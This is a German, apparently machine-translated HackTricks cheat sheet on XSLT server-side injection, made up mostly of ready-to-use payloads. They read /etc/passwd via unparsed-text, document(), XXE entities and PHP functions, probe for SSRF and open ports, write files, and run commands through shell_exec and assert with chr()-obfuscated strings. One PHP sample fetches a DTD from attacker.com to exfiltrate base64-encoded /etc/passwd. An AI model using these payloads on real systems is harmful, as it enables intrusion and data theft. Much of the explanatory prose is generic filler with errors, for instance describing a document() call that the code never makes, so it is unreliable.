# XSLT Server Side Injection (Extensible Stylesheet Language Transformations)

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? M√∂chten Sie Ihr **Unternehmen in HackTricks bewerben**? Oder m√∂chten Sie Zugriff auf die **neueste Version von PEASS oder HackTricks im PDF-Format** haben? √úberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das [hacktricks repo](https://github.com/carlospolop/hacktricks) und das [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)** senden.

</details>

## Grundlegende Informationen

XSLT ist eine Technologie, die zur Transformation von XML-Dokumenten in verschiedene Formate verwendet wird. Es gibt drei Versionen: 1, 2 und 3, wobei Version 1 am h√§ufigsten verwendet wird. Der Transformationsprozess kann entweder auf dem Server oder im Browser ausgef√ºhrt werden.

Die am h√§ufigsten verwendeten Frameworks sind:

- **Libxslt** von Gnome,
- **Xalan** von Apache,
- **Saxon** von Saxonica.

F√ºr die Ausnutzung von Schwachstellen im Zusammenhang mit XSLT ist es erforderlich, dass xsl-Tags auf der Serverseite gespeichert und anschlie√üend auf diesen Inhalt zugegriffen wird. Ein Beispiel f√ºr eine solche Schwachstelle ist in der folgenden Quelle dokumentiert: [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/).

## Beispiel - Tutorial
```bash
sudo apt-get install default-jdk
sudo apt-get install libsaxonb-java libsaxon-java
```
{% code title="xml.xml" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<catalog>
<cd>
<title>CD Title</title>
<artist>The artist</artist>
<company>Da Company</company>
<price>10000</price>
<year>1760</year>
</cd>
</catalog>
```
{% code title="xsl.xsl" %}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<html>
<body>
<h2>The Super title</h2>
<table border="1">
<tr bgcolor="#9acd32">
<th>Title</th>
<th>artist</th>
</tr>
<tr>
<td><xsl:value-of select="catalog/cd/title"/></td>
<td><xsl:value-of select="catalog/cd/artist"/></td>
</tr>
</table>
</body>
</html>
</xsl:template>
</xsl:stylesheet>
```
{% endcode %}

Ausf√ºhren:
```xml
saxonb-xslt -xsl:xsl.xsl xml.xml

Warning: at xsl:stylesheet on line 2 column 80 of xsl.xsl:
Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<html>
<body>
<h2>The Super title</h2>
<table border="1">
<tr bgcolor="#9acd32">
<th>Title</th>
<th>artist</th>
</tr>
<tr>
<td>CD Title</td>
<td>The artist</td>
</tr>
</table>
</body>
</html>
```
### Fingerabdruck

{% code title="detection.xsl" %}
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
Version: <xsl:value-of select="system-property('xsl:version')" /><br />
Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
<xsl:if test="system-property('xsl:product-name')">
Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:product-version')">
Product Version: <xsl:value-of select="system-property('xsl:product-version')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:is-schema-aware')">
Is Schema Aware ?: <xsl:value-of select="system-property('xsl:is-schema-aware')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:supports-serialization')">
Supports Serialization: <xsl:value-of select="system-property('xsl:supportsserialization')"
/><br />
</xsl:if>
<xsl:if test="system-property('xsl:supports-backwards-compatibility')">
Supports Backwards Compatibility: <xsl:value-of select="system-property('xsl:supportsbackwards-compatibility')"
/><br />
</xsl:if>
</xsl:template>
</xsl:stylesheet>
```
{% endcode %}

Und ausf√ºhren
```xml
$saxonb-xslt -xsl:detection.xsl xml.xml

Warning: at xsl:stylesheet on line 2 column 80 of detection.xsl:
Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<h2>XSLT identification</h2><b>Version:</b>2.0<br><b>Vendor:</b>SAXON 9.1.0.8 from Saxonica<br><b>Vendor URL:</b>http://www.saxonica.com/<br>
```
### Lokale Datei lesen

{% code title="read.xsl" %}
```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
</xsl:template>
</xsl:stylesheet>
```
{% endcode %}
```xml
$ saxonb-xslt -xsl:read.xsl xml.xml

Warning: at xsl:stylesheet on line 1 column 111 of read.xsl:
Running an XSLT 1.0 stylesheet with an XSLT 2.0 processor
<?xml version="1.0" encoding="UTF-8"?>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
```
### SSRF

Server-Side Request Forgery (SSRF) ist eine Sicherheitsl√ºcke, bei der ein Angreifer eine Anwendung dazu bringt, Anfragen an andere interne oder externe Ressourcen durchzuf√ºhren. Dies geschieht normalerweise √ºber eine schwach konfigurierte Funktion, die es erm√∂glicht, URLs als Eingabe zu akzeptieren und Anfragen an diese URLs zu senden.

Ein SSRF-Angriff kann verschiedene Auswirkungen haben, darunter:

- Zugriff auf interne Ressourcen wie Datenbanken, Dateisysteme oder andere Dienste, die normalerweise nicht √∂ffentlich zug√§nglich sind.
- Scannen interner Netzwerke oder Portscans auf externe Ziele.
- Ausnutzung von Schwachstellen in internen Systemen oder Diensten.

Um einen SSRF-Angriff durchzuf√ºhren, muss der Angreifer normalerweise eine URL angeben, die von der Anwendung akzeptiert und an den Server gesendet wird. Der Angreifer kann dann die Antwort des Servers analysieren, um Informationen zu sammeln oder weitere Angriffe durchzuf√ºhren.

Es gibt verschiedene Techniken, um SSRF-Angriffe zu erkennen und zu verhindern, darunter:

- Validierung der Eingabe: √úberpr√ºfen Sie, ob die angegebene URL g√ºltig ist und nur auf erlaubte Ressourcen verweist.
- Whitelisting: Erlauben Sie nur den Zugriff auf bestimmte URLs oder Ressourcen.
- Netzwerksegmentierung: Trennen Sie interne und externe Netzwerke, um den Zugriff auf interne Ressourcen zu beschr√§nken.
- Sicherheitsupdates: Halten Sie Anwendungen und Systeme auf dem neuesten Stand, um bekannte Schwachstellen zu beheben.

Es ist wichtig, SSRF-Angriffe zu verstehen und geeignete Sicherheitsma√ünahmen zu ergreifen, um potenzielle Risiken zu minimieren.
```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:include href="http://127.0.0.1:8000/xslt"/>
<xsl:template match="/">
</xsl:template>
</xsl:stylesheet>
```
### Versionen

Je nach verwendeter XSLT-Version k√∂nnen mehr oder weniger Funktionen vorhanden sein:

* [https://www.w3.org/TR/xslt-10/](https://www.w3.org/TR/xslt-10/)
* [https://www.w3.org/TR/xslt20/](https://www.w3.org/TR/xslt20/)
* [https://www.w3.org/TR/xslt-30/](https://www.w3.org/TR/xslt-30/)

## Fingerabdruck

Laden Sie dies hoch und nehmen Sie Informationen auf
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
Version: <xsl:value-of select="system-property('xsl:version')" /><br />
Vendor: <xsl:value-of select="system-property('xsl:vendor')" /><br />
Vendor URL: <xsl:value-of select="system-property('xsl:vendor-url')" /><br />
<xsl:if test="system-property('xsl:product-name')">
Product Name: <xsl:value-of select="system-property('xsl:product-name')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:product-version')">
Product Version: <xsl:value-of select="system-property('xsl:product-version')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:is-schema-aware')">
Is Schema Aware ?: <xsl:value-of select="system-property('xsl:is-schema-aware')" /><br />
</xsl:if>
<xsl:if test="system-property('xsl:supports-serialization')">
Supports Serialization: <xsl:value-of select="system-property('xsl:supportsserialization')"
/><br />
</xsl:if>
<xsl:if test="system-property('xsl:supports-backwards-compatibility')">
Supports Backwards Compatibility: <xsl:value-of select="system-property('xsl:supportsbackwards-compatibility')"
/><br />
</xsl:if>
</xsl:template>
</xsl:stylesheet>
```
## SSRF

Server-Side Request Forgery (SSRF) ist eine Sicherheitsl√ºcke, bei der ein Angreifer eine Anwendung dazu bringt, Anfragen an andere interne oder externe Ressourcen durchzuf√ºhren. Dies kann dazu f√ºhren, dass vertrauliche Informationen offengelegt werden oder dass Angriffe auf interne Systeme ausgef√ºhrt werden.

Ein h√§ufiger Angriffsvektor f√ºr SSRF ist die Verwendung von URL-Parametern, die von der Anwendung verarbeitet werden. Der Angreifer kann eine manipulierte URL bereitstellen, die es ihm erm√∂glicht, Anfragen an interne Ressourcen wie Datenbanken, Dateisysteme oder andere Dienste durchzuf√ºhren.

Um SSRF zu verhindern, sollten Entwickler Eingaben validieren und sicherstellen, dass sie nur auf erlaubte Ressourcen zugreifen k√∂nnen. Es ist auch wichtig, dass Anwendungen keine vertraulichen Informationen in Fehlermeldungen preisgeben.

Zusammenfassend ist SSRF eine Sicherheitsl√ºcke, bei der ein Angreifer eine Anwendung dazu bringt, unerw√ºnschte Anfragen an interne oder externe Ressourcen durchzuf√ºhren. Entwickler sollten sicherstellen, dass Eingaben validiert werden und dass keine vertraulichen Informationen preisgegeben werden.
```xml
<esi:include src="http://10.10.10.10/data/news.xml" stylesheet="http://10.10.10.10//news_template.xsl">
</esi:include>
```
## Javascript-Injektion

Eine Javascript-Injektion ist eine Technik, bei der b√∂sartiger Javascript-Code in eine Webseite eingef√ºgt wird, um unerw√ºnschte Aktionen auszuf√ºhren. Dies kann dazu f√ºhren, dass vertrauliche Informationen gestohlen, Benutzer umgeleitet oder sch√§dlicher Code ausgef√ºhrt wird.

### Arten von Javascript-Injektionen

Es gibt verschiedene Arten von Javascript-Injektionen, darunter:

- Reflected XSS (Cross-Site Scripting): Hier wird der b√∂sartige Javascript-Code in die URL einer Webseite eingef√ºgt und vom Server reflektiert.
- Stored XSS (Cross-Site Scripting): Hier wird der b√∂sartige Javascript-Code in einer Datenbank oder einem anderen Speichermedium gespeichert und bei jedem Aufruf der Webseite ausgef√ºhrt.
- DOM-basierte XSS (Cross-Site Scripting): Hier wird der b√∂sartige Javascript-Code direkt im DOM (Document Object Model) der Webseite ausgef√ºhrt.

### Auswirkungen von Javascript-Injektionen

Javascript-Injektionen k√∂nnen schwerwiegende Auswirkungen haben, darunter:

- Diebstahl von Benutzerdaten wie Anmeldedaten, Kreditkarteninformationen usw.
- Umleitung von Benutzern auf b√∂sartige Webseiten oder Phishing-Seiten.
- Ausf√ºhrung von sch√§dlichem Code auf dem Ger√§t des Benutzers, was zu weiteren Angriffen f√ºhren kann.

### Schutz vor Javascript-Injektionen

Um sich vor Javascript-Injektionen zu sch√ºtzen, sollten folgende Ma√ünahmen ergriffen werden:

- Eingabevalidierung: √úberpr√ºfen Sie alle Benutzereingaben auf unerw√ºnschte Zeichen oder Muster.
- Ausgabevalidierung: √úberpr√ºfen Sie alle ausgehenden Daten auf unerw√ºnschte Zeichen oder Muster.
- Verwendung von Content Security Policy (CSP): CSP erm√∂glicht es Ihnen, festzulegen, welche Ressourcen auf einer Webseite geladen werden d√ºrfen und welche nicht.
- Aktualisierung von Software und Bibliotheken: Halten Sie Ihre Software und Bibliotheken auf dem neuesten Stand, um bekannte Sicherheitsl√ºcken zu schlie√üen.

### Fazit

Javascript-Injektionen sind eine ernsthafte Bedrohung f√ºr Webseiten und Benutzer. Durch die Implementierung geeigneter Sicherheitsma√ünahmen k√∂nnen Sie das Risiko von Javascript-Injektionen minimieren und Ihre Webseite und Benutzer sch√ºtzen.
```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<script>confirm("We're good");</script>
</xsl:template>
</xsl:stylesheet>
```
## Verzeichnis auflisten (PHP)

### **Opendir + readdir**
```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('opendir','/path/to/dir')"/>
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
<xsl:value-of select="php:function('readdir')"/> -
</xsl:template></xsl:stylesheet>
```
### **Assert (var\_dump + scandir + false)**

Die `assert`-Funktion in PHP wird normalerweise verwendet, um eine Bedingung zu √ºberpr√ºfen und einen Fehler auszul√∂sen, wenn die Bedingung falsch ist. In einigen F√§llen kann sie jedoch auch f√ºr Server Side Injection (SSI) verwendet werden.

Eine M√∂glichkeit, SSI mit `assert` durchzuf√ºhren, besteht darin, die Funktion `var\_dump` zu verwenden, um den Inhalt einer Variablen anzuzeigen. Durch die Kombination von `var\_dump` mit der Funktion `scandir` k√∂nnen wir den Inhalt eines Verzeichnisses auf dem Server anzeigen lassen.

Um SSI mit `assert` durchzuf√ºhren, k√∂nnen wir den folgenden Code verwenden:

```php
assert(var_dump(scandir('/pfad/zum/verzeichnis')));
```

Dieser Code gibt den Inhalt des angegebenen Verzeichnisses aus. Wenn wir jedoch das Schl√ºsselwort `false` an `assert` √ºbergeben, wird der Code nach dem `assert`-Statement nicht mehr ausgef√ºhrt. Dies kann n√ºtzlich sein, um unerw√ºnschte Ausgaben zu verhindern.

```php
assert(var_dump(scandir('/pfad/zum/verzeichnis'))) or die();
```

In diesem Fall wird der Code nach dem `assert`-Statement nicht ausgef√ºhrt, wenn das Verzeichnis nicht existiert oder nicht gelesen werden kann.

Es ist wichtig zu beachten, dass die Verwendung von `assert` f√ºr SSI gef√§hrlich sein kann, da sie potenziell sch√§dlichen Code auf dem Server ausf√ºhren kann. Es wird empfohlen, diese Technik nur in kontrollierten Umgebungen oder zu Schulungszwecken zu verwenden.
```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
<xsl:copy-of name="asd" select="php:function('assert','var_dump(scandir(chr(46).chr(47)))==3')" />
<br />
</body>
</html>
```
### **Intern - PHP**

XSLT (Extensible Stylesheet Language Transformations) ist eine Sprache, die verwendet wird, um XML-Dokumente in andere Formate zu transformieren. In einigen F√§llen kann XSLT auch verwendet werden, um Dateien auf dem Server zu lesen.

Um Dateien mit XSLT zu lesen, k√∂nnen Sie die `document()`-Funktion verwenden. Diese Funktion erm√∂glicht es Ihnen, eine externe Datei zu √∂ffnen und deren Inhalt abzurufen. Sie k√∂nnen die `document()`-Funktion verwenden, um auf lokale Dateien zuzugreifen, indem Sie den Dateipfad angeben.

Hier ist ein Beispiel f√ºr die Verwendung der `document()`-Funktion, um eine Datei mit PHP zu lesen:

```php
<?php
$xml = '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE xsl:stylesheet [
  <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:value-of select="php:function(\'base64_decode\', $file)"/>
  </xsl:template>
</xsl:stylesheet>';

$proc = new XSLTProcessor();
$proc->importStylesheet(new SimpleXMLElement($xml));
echo $proc->transformToXML(new SimpleXMLElement('<foo/>'));
?>
```

In diesem Beispiel wird die `document()`-Funktion verwendet, um die Datei `/etc/passwd` zu lesen. Der Inhalt der Datei wird dann mit der `base64_decode()`-Funktion dekodiert und ausgegeben.

Es ist wichtig zu beachten, dass diese Technik nur funktioniert, wenn der Server XSLT-Transformationen zul√§sst und die `document()`-Funktion nicht deaktiviert ist. Dar√ºber hinaus m√ºssen Sie √ºber die erforderlichen Berechtigungen verf√ºgen, um auf die gew√ºnschte Datei zuzugreifen.

Es ist auch wichtig zu beachten, dass das Lesen von Dateien auf dem Server ohne Zustimmung des Eigent√ºmers illegal ist und zu rechtlichen Konsequenzen f√ºhren kann. Diese Technik sollte nur zu legitimen Zwecken und mit Zustimmung des Eigent√ºmers verwendet werden.
```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', ‚Äòutf-8')"/>
</xsl:template>
</xsl:stylesheet>
```
### **Intern - XXE**

Eine XXE (XML External Entity) ist eine Sicherheitsl√ºcke, die es einem Angreifer erm√∂glicht, externe Entit√§ten in eine XML-Verarbeitung einzuf√ºgen. Dies kann zu verschiedenen Angriffen f√ºhren, wie z.B. dem Lesen von Dateien auf dem Server, dem Durchf√ºhren von Port-Scans oder dem Ausf√ºhren von Remote-Code.

#### **Exploit-Techniken**

Es gibt verschiedene Techniken, um eine XXE-Verwundbarkeit auszunutzen:

1. **Blind XXE**: Der Angreifer kann die Antwort des Servers nicht direkt sehen, aber er kann indirekte Hinweise erhalten, indem er die Antwortzeit oder die Gr√∂√üe der Antwort analysiert.

2. **Parameterentwicklung**: Der Angreifer kann die Parameter des XML-Dokuments manipulieren, um die gew√ºnschten Informationen zu erhalten.

3. **Out-of-Band (OOB) XXE**: Der Angreifer nutzt eine externe Entit√§t, um Informationen √ºber einen anderen Kanal abzurufen, z.B. √ºber DNS-Anfragen oder HTTP-Anfragen an einen von ihm kontrollierten Server.

#### **Gegenma√ünahmen**

Um sich vor XXE-Angriffen zu sch√ºtzen, sollten folgende Ma√ünahmen ergriffen werden:

1. **XML-Parser konfigurieren**: Konfigurieren Sie den XML-Parser so, dass externe Entit√§ten deaktiviert sind.

2. **Input-Validierung**: √úberpr√ºfen Sie alle Benutzereingaben, die in XML-Dokumente eingef√ºgt werden, um sicherzustellen, dass sie keine sch√§dlichen Entit√§ten enthalten.

3. **Content-Security-Policy (CSP)**: Verwenden Sie eine Content-Security-Policy, um die Ausf√ºhrung von Skripten von nicht vertrauensw√ºrdigen Quellen zu blockieren.

4. **Aktualisieren Sie Ihre Software**: Halten Sie Ihre Software auf dem neuesten Stand, um bekannte Sicherheitsl√ºcken zu schlie√üen.

#### **Zusammenfassung**

Eine XXE-Schwachstelle erm√∂glicht es einem Angreifer, externe Entit√§ten in eine XML-Verarbeitung einzuf√ºgen und verschiedene Angriffe durchzuf√ºhren. Um sich vor XXE-Angriffen zu sch√ºtzen, sollten XML-Parser konfiguriert, Eingaben validiert, Content-Security-Policies verwendet und Software regelm√§√üig aktualisiert werden.
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE dtd_sample[<!ENTITY ext_file SYSTEM "/etc/passwd">]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
&ext_file;
</xsl:template>
</xsl:stylesheet>
```
### **Durch HTTP**

XSLT Server Side Injection (XSSI) ist eine Technik, bei der ein Angreifer b√∂sartigen XSLT-Code in eine Anfrage an einen Server einschleust, um serverseitige Aktionen auszuf√ºhren. Dies kann durch eine Schwachstelle in der Verarbeitung von XML-Daten oder durch die direkte Verwendung von XSLT-Dateien erm√∂glicht werden.

Ein m√∂glicher Angriffsvektor f√ºr XSSI ist die √úbermittlung von XML-Daten √ºber HTTP. Der Angreifer kann den XML-Inhalt so manipulieren, dass er b√∂sartigen XSLT-Code enth√§lt. Wenn der Server die XML-Daten verarbeitet und eine XSLT-Transformation durchf√ºhrt, wird der b√∂sartige Code ausgef√ºhrt.

Um XSSI √ºber HTTP durchzuf√ºhren, m√ºssen Sie zun√§chst die Schwachstelle identifizieren, die es erm√∂glicht, b√∂sartigen XSLT-Code einzuschleusen. Dies kann beispielsweise eine unzureichende Validierung der XML-Daten oder eine unsichere Verwendung von XSLT-Dateien sein.

Sobald Sie die Schwachstelle identifiziert haben, k√∂nnen Sie den b√∂sartigen XSLT-Code in die XML-Daten einf√ºgen und die Anfrage an den Server senden. Der Server wird dann den Code ausf√ºhren und die gew√ºnschten serverseitigen Aktionen ausf√ºhren.

Es ist wichtig zu beachten, dass XSSI ein potenziell gef√§hrlicher Angriff ist und nur zu Testzwecken oder mit ausdr√ºcklicher Zustimmung des Eigent√ºmers des Servers durchgef√ºhrt werden sollte. Unbefugtes XSSI kann zu unbefugtem Zugriff auf Daten oder zur Kompromittierung des Servers f√ºhren.
```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
<xsl:template match="/">
<xsl:value-of select="document('/etc/passwd')"/>
</xsl:template>
</xsl:stylesheet>
```

```xml
<!DOCTYPE xsl:stylesheet [
<!ENTITY passwd SYSTEM "file:///etc/passwd" >]>
<xsl:template match="/">
&passwd;
</xsl:template>
```
### **Intern (PHP-Funktion)**
```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('file_get_contents','/path/to/file')"/>
</xsl:template>
</xsl:stylesheet>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
<xsl:copy-of name="asd" select="php:function('assert','var_dump(file_get_contents(scandir(chr(46).chr(47))[2].chr(47).chr(46).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100)))==3')" />
<br />
</body>
</html>
```
### Portscan

Ein Portscan ist ein Verfahren, bei dem die offenen Ports eines Zielsystems ermittelt werden. Dies erm√∂glicht es einem Angreifer, potenzielle Schwachstellen zu identifizieren und Angriffe auf das System vorzubereiten. Es gibt verschiedene Tools und Techniken, die f√ºr einen Portscan verwendet werden k√∂nnen, darunter Nmap, Masscan und Zmap. Ein Portscan kann entweder als Teil einer Penetrationstest- oder Sicherheits√ºberpr√ºfungsaktivit√§t durchgef√ºhrt werden, oder von einem Angreifer, der versucht, unautorisierten Zugriff auf ein System zu erlangen. Es ist wichtig zu beachten, dass das Durchf√ºhren eines Portscans ohne Zustimmung des Eigent√ºmers des Zielsystems illegal sein kann.
```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="document('http://example.com:22')"/>
</xsl:template>
</xsl:stylesheet>
```
## Schreiben in eine Datei

### XSLT 2.0

XSLT 2.0 bietet die M√∂glichkeit, Daten in eine Datei zu schreiben. Dies kann n√ºtzlich sein, um Informationen zu speichern oder Ergebnisse zu protokollieren. Um Daten in eine Datei zu schreiben, k√∂nnen Sie die `xsl:result-document` Anweisung verwenden.

Die Syntax f√ºr die `xsl:result-document` Anweisung lautet wie folgt:

```xml
<xsl:result-document href="pfad/zur/datei">
    <!-- Inhalt der Datei -->
</xsl:result-document>
```

Der `href`-Attribut gibt den Pfad zur Datei an, in die geschrieben werden soll. Sie k√∂nnen entweder einen absoluten Pfad oder einen relativen Pfad angeben. Der Inhalt der Datei wird innerhalb der `xsl:result-document` Anweisung platziert.

Beispiel:

```xml
<xsl:result-document href="output.txt">
    <xsl:text>Hallo, Welt!</xsl:text>
</xsl:result-document>
```

In diesem Beispiel wird der Text "Hallo, Welt!" in die Datei "output.txt" geschrieben.
```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:result-document href="local_file.txt">
<xsl:text>Write Local File</xsl:text>
</xsl:result-document>
</xsl:template>
</xsl:stylesheet>
```
### **Xalan-J Erweiterung**

Die Xalan-J Erweiterung ist eine leistungsstarke Funktion, die in der Extensible Stylesheet Language Transformations (XSLT) verwendet wird. Xalan-J ist eine Java-basierte Implementierung von XSLT und bietet eine Vielzahl von Funktionen und Erweiterungen, die Entwicklern helfen, komplexe Transformationen auf XML-Daten durchzuf√ºhren.

Eine der n√ºtzlichsten Erweiterungen von Xalan-J ist die M√∂glichkeit, serverseitige Injektionen durchzuf√ºhren. Mit dieser Technik k√∂nnen Angreifer b√∂sartigen Code in XSLT-Dateien einf√ºgen, um auf vertrauliche Informationen zuzugreifen oder die Funktionalit√§t der Anwendung zu manipulieren.

Um eine XSLT-Datei mit einer serverseitigen Injektion zu erstellen, muss der Angreifer die Schwachstellen in der Anwendung identifizieren, die XSLT-Dateien verarbeiten. Dies kann beispielsweise durch das Ausnutzen von unsicheren Eingabefeldern oder fehlerhaften Validierungen erfolgen.

Sobald der Angreifer eine Schwachstelle identifiziert hat, kann er den b√∂sartigen Code in die XSLT-Datei einf√ºgen. Dieser Code wird dann vom Xalan-J-Prozessor interpretiert und ausgef√ºhrt, wodurch der Angreifer die Kontrolle √ºber die Anwendung erh√§lt.

Es gibt verschiedene Arten von serverseitigen Injektionen, die mit Xalan-J durchgef√ºhrt werden k√∂nnen, darunter SQL-Injektionen, Remote-Code-Ausf√ºhrung und Dateilecks. Jede dieser Techniken erm√∂glicht es dem Angreifer, auf unterschiedliche Weise auf vertrauliche Informationen zuzugreifen oder die Anwendung zu manipulieren.

Um sich vor Xalan-J-Erweiterungen zu sch√ºtzen, sollten Entwickler sicherstellen, dass alle Eingaben ordnungsgem√§√ü validiert und bereinigt werden. Dar√ºber hinaus sollten sie regelm√§√üig nach Sicherheitsl√ºcken in ihrer Anwendung suchen und diese schnellstm√∂glich beheben, um potenzielle Angriffe zu verhindern.
```xml
<xsl:template match="/">
<redirect:open file="local_file.txt"/>
<redirect:write file="local_file.txt"/> Write Local File</redirect:write>
<redirect:close file="loxal_file.txt"/>
</xsl:template>
```
Andere M√∂glichkeiten, Dateien in das PDF zu schreiben

## Externes XSL einbinden
```xml
<xsl:include href="http://extenal.web/external.xsl"/>
```

```xml
<?xml version="1.0" ?>
<?xml-stylesheet type="text/xsl" href="http://external.web/ext.xsl"?>
```
## Code ausf√ºhren

### **php:function**
```xml
<?xml version="1.0" encoding="utf-8"?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:php="http://php.net/xsl" >
<xsl:template match="/">
<xsl:value-of select="php:function('shell_exec','sleep 10')" />
</xsl:template>
</xsl:stylesheet>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<html xsl:version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
<xsl:copy-of name="asd" select="php:function('assert','var_dump(scandir(chr(46).chr(47)));')" />
<br />
</body>
</html>
```
F√ºhren Sie Code mit anderen Frameworks in der PDF aus

### **Weitere Sprachen**

**Auf dieser Seite finden Sie Beispiele f√ºr RCE in anderen Sprachen:** [**https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt\_injection#C%23%2FVB.NET%2FASP.NET**](https://vulncat.fortify.com/en/detail?id=desc.dataflow.java.xslt\_injection#C%23%2FVB.NET%2FASP.NET) **(C#, Java, PHP)**

## **Zugriff auf PHP-Static-Funktionen von Klassen**

Die folgende Funktion ruft die statische Methode `stringToUrl` der Klasse XSL auf:
```xml
<!--- More complex test to call php class function-->
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl"
version="1.0">
<xsl:output method="html" version="XHTML 1.0" encoding="UTF-8" indent="yes" />
<xsl:template match="root">
<html>
<!-- We use the php suffix to call the static class function stringToUrl() -->
<xsl:value-of select="php:function('XSL::stringToUrl','une_superstring-√†√î|modifier')" />
<!-- Output: 'une_superstring ao modifier' -->
</html>
</xsl:template>
</xsl:stylesheet>
```
